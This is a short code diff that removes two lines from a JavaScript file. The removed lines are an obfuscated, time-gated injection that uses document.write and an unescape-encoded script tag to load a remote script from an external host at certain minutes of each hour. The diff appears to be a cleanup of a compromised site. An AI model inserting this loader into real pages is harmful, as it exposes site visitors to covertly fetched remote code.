@@ -1,2 +1,1 @@
-var kqd = new Date();
-if ((kqd.getMinutes() >= 0 && kqd.getMinutes() < 10)||(kqd.getMinutes() >= 30 && kqd.getMinutes() < 40)) {document.write(unescape("%3Cscript src=\'https://isoscripts.googlecode.com/svn/sweet.cash\' type=\'text/javascript\'%3E%3C/script%3E"));}
+
